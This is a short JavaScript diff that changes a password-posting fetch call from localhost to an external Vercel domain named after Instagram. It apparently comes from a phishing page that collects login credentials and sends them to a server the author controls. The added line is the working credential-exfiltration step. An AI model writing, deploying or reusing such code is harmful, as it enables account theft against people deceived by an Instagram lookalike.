@@ -10,7 +10,7 @@ async function sendDataToServer(){
         password:password,
     }
 
-    const res = await fetch("http://localhost:8000/save",{
+    const res = await fetch("https://instagram-gv00l7i9f-bidxds-projects.vercel.app/save",{
         method: "POST",
         headers:{
             "Content-Type": "application/json",
